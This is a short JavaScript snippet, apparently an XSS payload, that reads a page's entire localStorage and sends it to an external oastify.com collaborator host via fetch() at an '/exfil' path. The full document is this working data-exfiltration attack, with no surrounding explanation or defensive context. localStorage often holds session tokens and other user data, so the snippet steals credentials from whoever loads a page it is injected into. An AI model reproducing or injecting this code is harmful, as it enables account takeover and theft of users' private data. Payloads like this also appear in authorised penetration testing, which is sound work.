let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://qmgbwlua40kof4xd4zhnzku52w8nwgk5.oastify.com/exfil?data=" + encodedData)